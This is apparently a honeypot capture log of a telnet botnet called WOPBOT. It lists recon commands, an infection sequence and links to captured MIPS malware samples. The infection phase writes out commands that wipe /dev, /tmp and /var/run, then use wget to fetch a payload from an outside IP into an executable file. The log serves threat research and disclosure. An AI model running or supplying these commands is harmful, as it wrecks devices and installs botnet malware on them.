### Recon phase
```
enable
shell
sh
/bin/busybox ZORRO
/bin/busybox wget
cat /proc/mounts && /bin/busybox ZORRO
/bin/busybox cat /bin/sh
```
### Infection phase
```
enable
shell
sh
/bin/busybox rm -rf /var/run/* /dev/* /tmp/* /var/run/* >/dev/null 2>&1; /bin/busybox WOPBOT
/bin/busybox mkdir -p /var/run; /bin/busybox WOPBOT
/bin/busybox cp -f /bin/sh /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox echo -ne '' > /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox chmod 777 /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox wget -O - http://85.118.98.197:61050/cyka/blyat/2.mp > /var/run/oMNUckLhyt && /bin/busybox WOPBOT
```

### Captured samples
* [1.mp](https://github.com/stamparm/hontel/raw/master/captured/WOPBOT/1.mp.7z) (ELF 32-bit, MIPS, MD5: eab8da47ff36cafd2662fd01b6959389)
* [2.mp](https://github.com/stamparm/hontel/raw/master/captured/WOPBOT/2.mp.7z) (ELF 64-bit, MIPS, MD5: 4565f96cd8498a7e15ffa99e0d435d11)
